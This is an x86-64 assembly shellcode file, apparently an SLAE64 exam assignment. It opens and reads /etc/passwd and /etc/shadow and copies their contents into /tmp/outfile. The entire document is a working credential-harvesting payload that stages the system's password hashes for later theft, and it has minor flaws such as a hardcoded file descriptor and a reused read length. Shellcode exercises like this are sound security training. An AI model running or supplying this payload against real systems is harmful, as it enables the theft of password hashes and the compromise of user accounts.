;Exam Assignment (other personnal shellcode)
;This shellcode open 2 files , /etc/passwd and /etc/shadow
; and write the output to a file -> /tmp/outfile
;Christophe G SLAE64 - 1337                 ;



global _start

_start:

   xor rax , rax
   xor rbx , rbx



   mov rdi , 0x64777373ffffffff
   shr rdi , 32
   push rdi
   mov rdi , 0x61702f2f6374652f   ; open /etc/passwd
   push rdi
   mov rdi , rsp
   push rax
   pop rsi
   push rax
   pop rdx
   add al , 0x2
   syscall

   mov r10b , al
   xor rdi , rdi
   mov dil , al
   xor rax , rax     ; read
   sub sp , 0xfff    ; buffer
   mov rsi , rsp
   mov dx , 0xfff    ; size
   syscall
   mov rbx , rax

   lea r8 , [rsi]  ; save data readed in the first file

   xor rax , rax
   mov dil , r10b  ; close
   add al , 0x3
   syscall

   xor rax , rax
   xor rsi , rsi
   xor rdx , rdx



   mov rdi , 0x776f6461ffffffff
   shr rdi , 32
   push rdi
   mov rdi , 0x68732f2f6374652f   ;open /etc/shadow
   push rdi
   mov rdi , rsp
   push ax
   add al , 0x2
   syscall

   mov r10b , al
   xor rdi , rdi
   mov dil , al
   xor rax , rax     ; read      read /etc/shadow
   sub sp , 0xfff    ; buffer
   mov rsi , rsp
   mov dx , 0xfff    ; size
   syscall

   lea r9 , [rsi]    ; save data readed in the second file 

   xor rax , rax
   mov dil , r10b  ; close
   add al , 0x3
   syscall

   xor rax , rax
   xor rsi , rsi
   push ax
   push 0x656c6966
   mov rdi , 0x74756f2f706d742f   ;open O_WRONLY|O_CREAT|O_APPEND /tmp/outfile
   push rdi
   mov rdi , rsp
   push ax
   add al , 0x2
   mov si , 0x441
   mov dx , 0x2f3
   syscall

   mov r10b  , al
   xor rax , rax
   xor rdi , rdi
   mov dil , 0x3  ; write first part to file
   mov rsi , r9  
   mov dx , bx ;
   add al , 0x1
   syscall

   xor rax ,rax
   mov rsi , r8  ; write second part to file
   add al , 0x1
   syscall


   xor rax , rax
   mov dil , r10b  ; close
   add al , 0x3
   syscall


   xor rax , rax
   mov al , 60
   syscall




